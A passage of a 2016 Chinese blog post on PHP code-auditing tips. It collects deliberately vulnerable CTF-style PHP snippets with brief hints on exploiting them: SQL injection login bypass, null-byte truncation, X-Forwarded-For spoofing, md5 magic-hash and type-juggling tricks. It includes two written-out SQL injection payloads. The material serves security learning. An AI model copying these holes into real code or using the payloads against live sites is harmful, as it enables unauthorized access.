class="line"></span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 通过构造sql语句使row[pw]等于pass</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>正则漏洞，%00截断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(&quot;*******&quot;, &quot;****&quot;, &quot;****&quot;);</span><br><span class="line">    mysql_select_db(&quot;****&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;select user from php where (user=&#x27;$user&#x27;) and (pw=&#x27;$pass&#x27;)&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">    printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">//echo $row[&quot;pw&quot;];</span><br><span class="line">  if($row[&#x27;user&#x27;]==&quot;admin&quot;) &#123;</span><br><span class="line">    echo &quot;&lt;p&gt;Logged in! Key: *********** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if($row[&#x27;user&#x27;] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>闭合注入，绕过验证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function GetIP()&#123;</span><br><span class="line">if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))</span><br><span class="line">    $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];</span><br><span class="line">else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))</span><br><span class="line">    $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];</span><br><span class="line">else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))</span><br><span class="line">    $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">else</span><br><span class="line">    $cip = &quot;0.0.0.0&quot;;</span><br><span class="line">return $cip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$GetIPs = GetIP();</span><br><span class="line">if ($GetIPs==&quot;1.1.1.1&quot;)&#123;</span><br><span class="line">echo &quot;Great! Key is *********&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;错误！你的IP不在访问列表之内！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>添加http头即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 = md5(&#x27;QNKCDZO&#x27;);</span><br><span class="line">$a = @$_GET[&#x27;a&#x27;];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    echo &quot;nctf&#123;*****************&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>240610708神奇的数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#x27;$id&#x27;&quot;));</span><br><span class="line">  if ($_GET[id]==1024) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">    echo($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>1024.1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (isset ($_GET[&#x27;nctf&#x27;])) &#123;</span><br><span class="line">    if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;nctf&#x27;]) === FALSE)</span><br><span class="line">        echo &#x27;必须输入数字才行&#x27;;</span><br><span class="line">    else if (strpos ($_GET[&#x27;nctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE)   </span><br><span class="line">        die(&#x27;Flag: &#x27;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &#x27;骚年，继续努力吧啊~&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此处还可以数组绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &#x27;db.inc.php&#x27;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">    if(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&#x27;username&#x27;]);</span><br><span class="line">$password = @clean((string)$_GET[&#x27;password&#x27;]);</span><br><span class="line"></span><br><span class="line">$query=&#x27;SELECT * FROM users WHERE name=\&#x27;&#x27;.$username.&#x27;\&#x27; AND pass=\&#x27;&#x27;.$password.&#x27;\&#x27;;&#x27;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">    die(&#x27;Invalid password!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query=&#x27;SELECT * FROM users WHERE name=\&#x27;&#x27;admin\&#x27;\&#x27; AND pass=\&#x27;&#x27;or 1 #&#x27;\&#x27;;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &#x27;:&#x27; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#x27; $user &#x27;&quot;));</span><br><span class="line">  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line"></span><br><span class="line">    //strcasecmp:0 - 如果两个字符串相等</span><br><span class="line"></span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:user=admin&#x27; and 0=1 union select &#x27;47bce5c74f589f4867dbd57e9ca9f808&#x27; #&amp;pass=aaa</span><br></pre></td></tr></table></figure>
+
+
+
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：PHP代码审计TIPS</li>
+        <li>Post author：langu_xyz</li>
+        <li>Create time：2016-10-01 21:00:00</li>
+        <li>
+            Post link：https://blog.langu.xyz/PHP代码审计TIPS/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/XSS%E5%88%A9%E7%94%A8%E4%B9%8BCookie%20/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">XSS利用之Cookie</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Linux系统加固</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
